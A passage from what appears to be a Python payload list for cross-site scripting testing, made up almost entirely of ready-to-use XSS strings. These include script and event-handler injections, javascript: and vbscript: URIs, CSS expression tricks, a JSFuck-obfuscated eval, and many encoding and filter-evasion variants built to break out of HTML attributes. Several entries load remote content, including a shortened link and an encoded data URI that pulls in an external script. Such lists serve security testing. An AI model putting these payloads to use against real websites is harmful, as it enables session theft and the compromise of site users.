             '&apos;; confirm(1); &apos;', '\\u0027 confirm(1); \\u0027',
             '"; [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])(); "',
             '"; eval(\'\\u0061\'+\'\\x6c\'+\'e\'+\'r\'+\'t\')(2); "', '"; alert&#40 3&#41 ; "',
             '"; javascript:&#x61;ler\\u0074&lpar;4); "',
             '"; javascript:window.open(\'data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==\'); "',
             '"onmouseover="alert(1)', '&#34;onmouseover=&#34;alert(1)', '&#x00022;onmouseover=&#x00022;alert(1)',
             '%22onmouseover=%22alert(1)', '&quot;onmouseover=&quot;alert(1)', '\\u0022onmouseover=\\u0022alert(1)',
             'width:expression(prompt(1))', 'width:ex/**/pression(prompt(1))',
             'width&#x3A;ex/**/pression&#x28;prompt&#x28;1&#x29;&#x29;', 'width:expression\\28 prompt \\28 1 \\29 \\29',
             'width:\\0065\\0078\\0070\\0072\\0065\\0073\\0073\\0069\\006F\\006E\\0028\\0070\\0072\\006F\\006D\\0070\\0074\\0028\\0031\\0029\\0029"',
             'background-image: url(javascript:prompt(1))',
             '<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe',
             '"><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe',
             "'><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe",
             '"><img src=x onerror=window.open(\'http://www.opensecurity.in/\');>',
             '<object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>',
             '"><object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>',
             "'><object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>",
             '<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>',
             '"><a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>',
             '\'><a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>',
             '<svg+onload=confirm(1);>', '"><svg+onload=confirm(1);>', "'><svg+onload=confirm(1);>",
             '<svg onload=prompt(1);>', '"><svg onload=prompt(1);>', "'><svg onload=prompt(1);>",
             '<input+onfocus=alert(1)>', '"><input+onfocus=alert(1)>', "'><input+onfocus=alert(1)>",
             '???script?alert(1)?/script?', '&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;',
             '<a href="j&#x26;#x26#x41;vascript:alert%252831337%2529">X</a>',
             '"><a href="j&#x26;#x26#x41;vascript:alert%252831337%2529">X</a>',
             '\'><a href="j&#x26;#x26#x41;vascript:alert%252831337%2529">X</a>',
             '<scr\\x00ipt>confirm(1);</scr\\x00ipt>', '"><scr\\x00ipt>confirm(1);</scr\\x00ipt>',
             "'><scr\\x00ipt>confirm(1);</scr\\x00ipt>", '<svg/onload=prompt(1);>', '"><svg/onload=prompt(1);>',
             "'><svg/onload=prompt(1);>", '<svg><script>alert&#40/1/&#41</script>',
             '"><svg><script>alert&#40/1/&#41</script>', "'><svg><script>alert&#40/1/&#41</script>",
             '<isindex action="javas&Tab;cript:alert(1)" type=image>',
             '"><isindex action="javas&Tab;cript:alert(1)" type=image>',
             '\'><isindex action="javas&Tab;cript:alert(1)" type=image>',
             "<form action='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'><button>CLICK",
             '"><form action=\'data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt\'><button>CLICK',
             "'><form action='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'><button>CLICK",
             "<form action='java&Tab;scri&Tab;pt:alert(1)'><button>CLICK",
             '"><form action=\'java&Tab;scri&Tab;pt:alert(1)\'><button>CLICK',
             "'><form action='java&Tab;scri&Tab;pt:alert(1)'><button>CLICK",
             '<form action=javascript&NewLine;:alert(1)><input type=submit>',
             '"><form action=javascript&NewLine;:alert(1)><input type=submit>',
             "'><form action=javascript&NewLine;:alert(1)><input type=submit>",
             '<form action="javas&Tab;cript:alert(1)" method="get"><input type="submit" value="Submit"></form>',
             '"><form action="javas&Tab;cript:alert(1)" method="get"><input type="submit" value="Submit"></form>',
             '\'><form action="javas&Tab;cript:alert(1)" method="get"><input type="submit" value="Submit"></form>',
             '<form action="&Tab;javas&Tab;cript&Tab;:alert(\'X :)\')" autocomplete="on"> First name:<input type="text" name="fname"><br><input type="submit"></form>',
             '"><form action="&Tab;javas&Tab;cript&Tab;:alert(\'X :)\')" autocomplete="on"> First name:<input type="text" name="fname"><br><input type="submit"></form>',
             '\'><form action="&Tab;javas&Tab;cript&Tab;:alert(\'X :)\')" autocomplete="on"> First name:<input type="text" name="fname"><br><input type="submit"></form>',
             '<form id="myform" value="" action=javascript&Tab;:eval(document.getElementById(\'myform\').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>',
             '"><form id="myform" value="" action=javascript&Tab;:eval(document.getElementById(\'myform\').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>',
             '\'><form id="myform" value="" action=javascript&Tab;:eval(document.getElementById(\'myform\').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>',
             '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)',
             '"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)',
             "'></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/X/) type=submit>\'-->"></script><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script>"><img/id="confirm&lpar;1&#x29;"/alt="/"src="/"onerror=eval(id&#x29;>\'"><img src="http://127.0.0.1:3555/xss_serve_payloads/X.jpg">',
             '<script>var url = "<!--<script>";//</script>alert(1)</script>',
             '</ScrIpt><script>var url = "<!--<script>";//</script>alert(1)</script>',
             '"><script>var url = "<!--<script>";//</script>alert(1)</script>',
             '</ScrIpt><script>var url = "<!--<script>";//</script>alert(1)</script>',
             '\'><script>var url = "<!--<script>";//</script>alert(1)</script>',
             '</ScrIpt><script>var url = "<!--<script>";//</script>alert(1)</script>',
             '<form id="myform" value=""+{valueOf:location,length:1,__proto__:[],0:"javascript :alert (1)"}"action=javascript&Tab;:eval(document.getElementById(\'myform\').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>',
             '"><form id="myform" value=""+{valueOf:location,length:1,__proto__:[],0:"javascript :alert (1)"}"action=javascript&Tab;:eval(document.getElementById(\'myform\').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>',
             '\'><form id="myform" value=""+{valueOf:location,length:1,__proto__:[],0:"javascript :alert (1)"}"action=javascript&Tab;:eval(document.getElementById(\'myform\').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>',
             '<iframe/src="data:text/html,<svg%09%0A%0B%0C%0D%A0%00%20onload=confirm(1);>">',
             '"><iframe/src="data:text/html,<svg%09%0A%0B%0C%0D%A0%00%20onload=confirm(1);>">',
             '\'><iframe/src="data:text/html,<svg%09%0A%0B%0C%0D%A0%00%20onload=confirm(1);>">',
             '<svg/contentScriptType=text/vbs><script>Execute(MsgBox(chr(75)&chr(67)&chr(70)))',
             '"><svg/contentScriptType=text/vbs><script>Execute(MsgBox(chr(75)&chr(67)&chr(70)))',
             "'><svg/contentScriptType=text/vbs><script>Execute(MsgBox(chr(75)&chr(67)&chr(70)))",
             "<img/src='http://127.0.0.1:3555/xss_serve_payloads/X.jpg' onmouseover=&Tab;prompt(1)",
             '"><img/src=\'http://127.0.0.1:3555/xss_serve_payloads/X.jpg\' onmouseover=&Tab;prompt(1)',
             "'><img/src='http://127.0.0.1:3555/xss_serve_payloads/X.jpg' onmouseover=&Tab;prompt(1)",
             '<svg><script>alert&#40 1&#41', '"><svg><script>alert&#40 1&#41', "'><svg><script>alert&#40 1&#41",
             '<embed/src=//goo.gl/nlX0P>', '"><embed/src=//goo.gl/nlX0P>', "'><embed/src=//goo.gl/nlX0P>",
             '<object/data=//goo.gl/nlX0P>', '"><object/data=//goo.gl/nlX0P>', "'><object/data=//goo.gl/nlX0P>",
             'x:anytext/**/xxxx/**/n(alert(1)) ("\\"))))))expressio\\")', "x: /**/ression(alert(1))('\\')exp\\')",
             '/*@cc_on alert(1) @*/', '{get[alert`1`](){}}', 'a= {get[alert`1`](){}}', 'alert`1`', '-alert`1`-',
             '+alert`1`+', "+alert(1)+'", '\\u{0000000000000061}lert(1)', '"onmouseover=%0A"confirm(1)',
             '/src=data:,alert(1)', 'accesskey="X" onclick="alert(1)""', 'accesskey=X onclick=alert(1)',
             '$})}}}});alert(1);({0:{0:{0:function(){0({',
             "''+{valueOf:location, toString:[].join,0:'javascript:prompt%281%29?,length:1}",
             'javascript://\'/</title></style></textarea></script>--><p"%0A onclick=alert(1)//>*/alert(1)/*',
             'javascript://--></script></title></style>"/</textarea>*/<alert(1)/*\'%0A onclick=alert(1)//>a',
             'javascript://</title>"/</script></style></textarea/-->*/<alert(1)/*\'%0D%0A onclick=alert(1)//>/',
             'javascript://\'/</title></style></textarea></script>--><p"%0D%0A onclick=alert(1)//>*/alert(1)/*',
             '%09javascript://\'/</title></style></textarea></script>--><p"%0D%0A onclick=alert(1)//>*/alert(1)/*',
             'javascript:/*--></title></style></textarea></script><svg/onload=click() onclick=\'+/" /+/ onmouseover=1/+/[*/[]/+alert(1)//\'>',
             'javascript:alert(1)//</title></style></script>-->";alert(1)//*/alert(1)/*<a \';alert(1)//\\\' onclick=alert(1)//> %0D %0A alert(1)//',
             'javascript:alert(1)//--></script></textarea></style></title><a"//\' onclick=alert(1)//>*/alert(1)/*',
             'avascript:/*--></textarea></style></button></script></meta><select/onclick=\'+/"/+/[*/[]/+alert(1)//\'>',
             '<style>@keyframes x{</style><div style=animation-name:x onanimationstart=alert(1)>',
             '"><style>@keyframes x{</style><div style=animation-name:x onanimationstart=alert(1)>',
             "'><style>@keyframes x{</style><div style=animation-name:x onanimationstart=alert(1)>",
             '<div style=\'x:anytext/**/xxxx/**/n(alert(1)) ("\\"))))))expressio\\")\'>aa</div>',
             '"><div style=\'x:anytext/**/xxxx/**/n(alert(1)) ("\\"))))))expressio\\")\'>aa</div>',
             '\'><div style=\'x:anytext/**/xxxx/**/n(alert(1)) ("\\"))))))expressio\\")\'>aa</div>',
             '<div style="x: /**/ression(alert(1))(\'\\\')exp\\\')">',
             '"><div style="x: /**/ression(alert(1))(\'\\\')exp\\\')">',
             '\'><div style="x: /**/ression(alert(1))(\'\\\')exp\\\')">', '<script>/*@cc_on alert(1) @*/</script>',
             '</ScrIpt><script>/*@cc_on alert(1) @*/</script>', '"><script>/*@cc_on alert(1) @*/</script>',
             '</ScrIpt><script>/*@cc_on alert(1) @*/</script>', "'><script>/*@cc_on alert(1) @*/</script>",
             '</ScrIpt><script>/*@cc_on alert(1) @*/</script>', '<picture><source srcset=1><img onerror=alert(1)>',
             '"><picture><source srcset=1><img onerror=alert(1)>', "'><picture><source srcset=1><img onerror=alert(1)>",
             "<script>''+{valueOf:location, toString:[].join,0:'javascript:prompt%281%29?,length:1}</script>",
             "</ScrIpt><script>''+{valueOf:location, toString:[].join,0:'javascript:prompt%281%29?,length:1}</script>",
             '"><script>\'\'+{valueOf:location, toString:[].join,0:\'javascript:prompt%281%29?,length:1}</script>',
             "</ScrIpt><script>''+{valueOf:location, toString:[].join,0:'javascript:prompt%281%29?,length:1}</script>",
             "'><script>''+{valueOf:location, toString:[].join,0:'javascript:prompt%281%29?,length:1}</script>",
             "</ScrIpt><script>''+{valueOf:location, toString:[].join,0:'javascript:prompt%281%29?,length:1}</script>",
             '<script>alert`1`</script>', '</ScrIpt><script>alert`1`</script>', '"><script>alert`1`</script>',
             '</ScrIpt><script>alert`1`</script>', "'><script>alert`1`</script>", '</ScrIpt><script>alert`1`</script>',
             '<svg><script>prompt(1)<p', '"><svg><script>prompt(1)<p', "'><svg><script>prompt(1)<p",
             '<div/onmouseover=confirm(1)>div</div', '"><div/onmouseover=confirm(1)>div</div',
             "'><div/onmouseover=confirm(1)>div</div", '<input onresize=alert(1)>', '"><input onresize=alert(1)>',
             "'><input onresize=alert(1)>", '<input onActivate=alert(1) autofocus>',
             '"><input onActivate=alert(1) autofocus>', "'><input onActivate=alert(1) autofocus>",
             '<input onBeforeActivate=alert(1) autofocus>', '"><input onBeforeActivate=alert(1) autofocus>',
             "'><input onBeforeActivate=alert(1) autofocus>", '<input type="hidden" accesskey="X" onclick="alert(1)">',
             '"><input type="hidden" accesskey="X" onclick="alert(1)">',
             '\'><input type="hidden" accesskey="X" onclick="alert(1)">', '<script>a= {get[alert`1`](){}}</script>',
             '</ScrIpt><script>a= {get[alert`1`](){}}</script>', '"><script>a= {get[alert`1`](){}}</script>',
             '</ScrIpt><script>a= {get[alert`1`](){}}</script>', "'><script>a= {get[alert`1`](){}}</script>",
             '</ScrIpt><script>a= {get[alert`1`](){}}</script>', '<script>+{[atob`dG9TdHJpbmc`]()alert`1`}</script>',
             '</ScrIpt><script>+{[atob`dG9TdHJpbmc`]()alert`1`}</script>',
             '"><script>+{[atob`dG9TdHJpbmc`]()alert`1`}</script>',
             '</ScrIpt><script>+{[atob`dG9TdHJpbmc`]()alert`1`}</script>',
             "'><script>+{[atob`dG9TdHJpbmc`]()alert`1`}</script>",
             '</ScrIpt><script>+{[atob`dG9TdHJpbmc`]()alert`1`}</script>', '<script/src=data:,alert(1)>',
             '"><script/src=data:,alert(1)>', "'><script/src=data:,alert(1)></script>", '"><script/src=data:,alert(1)>',
             '"><script/src=data:,alert(1)>', "'><script/src=data:,alert(1)></script>", "'><script/src=data:,alert(1)>",
             '"><script/src=data:,alert(1)>', "'><script/src=data:,alert(1)></script>",
             '<input/autofocus/onfocus=alert(1)>', '"><input/autofocus/onfocus=alert(1)>',
             "'><input/autofocus/onfocus=alert(1)>", '</script><svg><script>alert(1)+&quot;',
             '"></script><svg><script>alert(1)+&quot;', "'></script><svg><script>alert(1)+&quot;",
             '<script/src=data:,alert(1)>', '"><script/src=data:,alert(1)>', "'><script/src=data:,alert(1)>",
             '<marquee/onstart=alert(1)>', '"><marquee/onstart=alert(1)>', "'><marquee/onstart=alert(1)>",
             '<video/poster/onerror=alert(1)>', '"><video/poster/onerror=alert(1)>',
             "'><video/poster/onerror=alert(1)>", '<isindex/autofocus/onfocus=alert(1)>',
             '"><isindex/autofocus/onfocus=alert(1)>', "'><isindex/autofocus/onfocus=alert(1)>",
             '<body onload="$})}}}});alert(1);({0:{0:{0:function(){0({">',
             '"><body onload="$})}}}});alert(1);({0:{0:{0:function(){0({">',
             '\'><body onload="$})}}}});alert(1);({0:{0:{0:function(){0({">',
             '<iframe name=alert(1) src="//x?x=\',__defineSetter__(\'x\',eval),x=name,\'"></iframe>',
             '"><iframe name=alert(1) src="//x?x=\',__defineSetter__(\'x\',eval),x=name,\'"></iframe>',
             '\'><iframe name=alert(1) src="//x?x=\',__defineSetter__(\'x\',eval),x=name,\'"></iframe>',
             '\';alert(String.fromCharCode(88,83,83))//\';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>',
             '">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1)',
             '"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)',
             "'></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->" ></script><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>\'"><img src="http: //i.imgur.com/P8mL8.jpg?>',
             '" onclick=alert(1)//<button ? onclick=alert(1)//> */ alert(1)//', 'javascript:confirm(1)',
             'javascript:confirm(1);', 'javascript:alert(1)', 'javascript:alert(1);', 'avascript&#00058;alert(1)',
             'javaSCRIPT&colon;alert(1)', 'JaVaScRipT:alert(1)', 'javas&Tab;cript:\\u0061lert(1);',
             'javascript:\\u0061lert&#x28;1&#x29', 'javascript&#x3A;alert&lpar;1&rpar;', 'javascript&colon;alert(1)',
             'javascript&#x3A;alert(1)', 'j&#x61;v&#x41;sc&#x52;ipt&#x3A;alert(1)',
             'j&#x61;v&#x41;sc&#x52;ipt&#x3A;al&#x65;rt&lpar;1&rpar;', 'vbscript:alert(1);',
             'vbscript&#00058;alert(1);', 'vbscr&Tab;ipt:alert(1)"', '<iframesrc="javascript:alert(2)">',
             '"><iframesrc="javascript:alert(2)">', '\'><iframesrc="javascript:alert(2)">',
             '<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '"><iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '\'><iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '<isindexformaction="javascript:alert(1)" type=image>',
             '"><isindexformaction="javascript:alert(1)" type=image>',
             '\'><isindexformaction="javascript:alert(1)" type=image>',
             '<input type="image" formaction=JaVaScript:alert(0)>',
             '"><input type="image" formaction=JaVaScript:alert(0)>',
             '\'><input type="image" formaction=JaVaScript:alert(0)>',
             '<form><button formaction=javascript&colon;alert(1)>CLICKME',
             '"><form><button formaction=javascript&colon;alert(1)>CLICKME',
             "'><form><button formaction=javascript&colon;alert(1)>CLICKME",
             '<form action="Javascript:alert(1)"><input type=submit>',
             '"><form action="Javascript:alert(1)"><input type=submit>',
             '\'><form action="Javascript:alert(1)"><input type=submit>',
             '<isindex action="javascript:alert(1)" type=image>', '"><isindex action="javascript:alert(1)" type=image>',
             '\'><isindex action="javascript:alert(1)" type=image>',
             '<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>',
             '"><isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>',
             "'><isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>",
             '<isindex action=data:text/html, type=image>', '"><isindex action=data:text/html, type=image>',
             "'><isindex action=data:text/html, type=image>", '?/><marquee onfinish=confirm(1)>a</marquee>',
             '<object data=\'data:text/xml,<script xmlns="http://www.w3.org/1999/xhtml ">confirm(1)</script>>\'>',
             '"><object data=\'data:text/xml,<script xmlns="http://www.w3.org/1999/xhtml ">confirm(1)</script>>\'>',
             '\'><object data=\'data:text/xml,<script xmlns="http://www.w3.org/1999/xhtml ">confirm(1)</script>>\'>',
             '<img src= "a" onerror= \'eval(atob("cHJvbXB0KDEpOw=="))\'',
             '"><img src= "a" onerror= \'eval(atob("cHJvbXB0KDEpOw=="))\'',
             '\'><img src= "a" onerror= \'eval(atob("cHJvbXB0KDEpOw=="))\'', "<script>alert('X')</script>=a",
             "</ScrIpt><script>alert('X')</script>=a", '"><script>alert(\'X\')</script>=a',
             "</ScrIpt><script>alert('X')</script>=a", "'><script>alert('X')</script>=a",
             "</ScrIpt><script>alert('X')</script>=a",
             '<script>document.write(toStaticHTML("<style>div{font-family:rgb(\'0,0,0)\'\'\'}foo\');color=expression(alert(1));{}</style><div>POC</div>"))</script>',
             '</ScrIpt><script>document.write(toStaticHTML("<style>div{font-family:rgb(\'0,0,0)\'\'\'}foo\');color=expression(alert(1));{}</style><div>POC</div>"))</script>',
             '"><script>document.write(toStaticHTML("<style>div{font-family:rgb(\'0,0,0)\'\'\'}foo\');color=expression(alert(1));{}</style><div>POC</div>"))</script>',
             '</ScrIpt><script>document.write(toStaticHTML("<style>div{font-family:rgb(\'0,0,0)\'\'\'}foo\');color=expression(alert(1));{}</style><div>POC</div>"))</script>',
             '\'><script>document.write(toStaticHTML("<style>div{font-family:rgb(\'0,0,0)\'\'\'}foo\');color=expression(alert(1));{}</style><div>POC</div>"))</script>',
             '</ScrIpt><script>document.write(toStaticHTML("<style>div{font-family:rgb(\'0,0,0)\'\'\'}foo\');color=expression(alert(1));{}</style><div>POC</div>"))</script>',
             '\';!--"<XSS><script>alert(1);</script>', '</ScrIpt><script>alert(1);</script>',
             '"><script>alert(1);</script>', '</ScrIpt><script>alert(1);</script>', "'><script>alert(1);</script>",
             '</ScrIpt><script>alert(1);</script>={()}',
             '<script>document.body.innerHTML="<a onmouseover%0B=location=\'\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x61\\x6C\\x65\\x72\\x74\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B\'><input name=attributes>";</script>',
             '</ScrIpt><script>document.body.innerHTML="<a onmouseover%0B=location=\'\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x61\\x6C\\x65\\x72\\x74\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B\'><input name=attributes>";</script>',
             '"><script>document.body.innerHTML="<a onmouseover%0B=location=\'\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x61\\x6C\\x65\\x72\\x74\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B\'><input name=attributes>";</script>',
             '</ScrIpt><script>document.body.innerHTML="<a onmouseover%0B=location=\'\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x61\\x6C\\x65\\x72\\x74\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B\'><input name=attributes>";</script>',
             '\'><script>document.body.innerHTML="<a onmouseover%0B=location=\'\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x61\\x6C\\x65\\x72\\x74\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B\'><input name=attributes>";</script>',
             '</ScrIpt><script>document.body.innerHTML="<a onmouseover%0B=location=\'\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x61\\x6C\\x65\\x72\\x74\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B\'><input name=attributes>";</script>',
             'asfunction:getURL,javascript:alert(1)//', '\\%22))}catch(e){}if(!self.a)self.a=!alert(1)//',
             '"]%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%281%29;//',
             '0%5C"))%7Dcatch(e)%7Bif(!window.x)%7Bwindow.x=1;alert(1)%7D%7D//', '<button/onclick=alert(1) >X</button>',
             '"><button/onclick=alert(1) >X</button>', "'><button/onclick=alert(1) >X</button>",
             '<a onmouseover=(alert(1))>X</a>', '"><a onmouseover=(alert(1))>X</a>',
             "'><a onmouseover=(alert(1))>X</a>", '<p/onmouseover=javascript:alert(1); >X</p>',
             '"><p/onmouseover=javascript:alert(1); >X</p>', "'><p/onmouseover=javascript:alert(1); >X</p>",
             '<article xmlns="><img src=x onerror=alert(1)"></article>',
             '"><article xmlns="><img src=x onerror=alert(1)"></article>',
             '\'><article xmlns="><img src=x onerror=alert(1)"></article>',
             '<article xmlns="x:img src=x onerror=alert(1) ">', '"><article xmlns="x:img src=x onerror=alert(1) ">',
             '\'><article xmlns="x:img src=x onerror=alert(1) ">',
             '<p style="font-family:\'\\22\\3bx:expression(alert(1))/*\'">',
             '"><p style="font-family:\'\\22\\3bx:expression(alert(1))/*\'">',
             '\'><p style="font-family:\'\\22\\3bx:expression(alert(1))/*\'">',
             '<listing>&ltimg src=x onerror=alert(1)&gt</listing>',
             '"><listing>&ltimg src=x onerror=alert(1)&gt</listing>',
             "'><listing>&ltimg src=x onerror=alert(1)&gt</listing>", '"onmouseover=alert(1);a="',
             "'+alert(1)&&null=='", "+alert(1)&&null=='", "\\\\\\'><script>1<\\\\/script>",
             "\\\\\\'><body onload=\\\\\\'1\\\\\\'>", '\\"><script>1<\\\\/script>', '><script>1<\\\\/script>',
             '\\"><body onload=\\"1\\">', '<img src=\\"x:X\\" onerror=\\"alert(1)\\">',
             '"><img src=\\"x:X\\" onerror=\\"alert(1)\\">', '\'><img src=\\"x:X\\" onerror=\\"alert(1)\\">',
             '<img src=a onerror=alert(1)', '"><img src=a onerror=alert(1)', "'><img src=a onerror=alert(1)",
             "<script>alert(\\'1\\')</script>", "</ScrIpt><script>alert(\\'1\\')</script>",
             '"><script>alert(\\\'1\\\')</script>', "</ScrIpt><script>alert(\\'1\\')</script>",
             "'><script>alert(\\'1\\')</script>", "</ScrIpt><script>alert(\\'1\\')</script>",
             "<script>alert(\\'\\\\\\\\1\\\\\\\\\\')</script>",
             "</ScrIpt><script>alert(\\'\\\\\\\\1\\\\\\\\\\')</script>",
             '"><script>alert(\\\'\\\\\\\\1\\\\\\\\\\\')</script>',
             "</ScrIpt><script>alert(\\'\\\\\\\\1\\\\\\\\\\')</script>",
             "'><script>alert(\\'\\\\\\\\1\\\\\\\\\\')</script>",
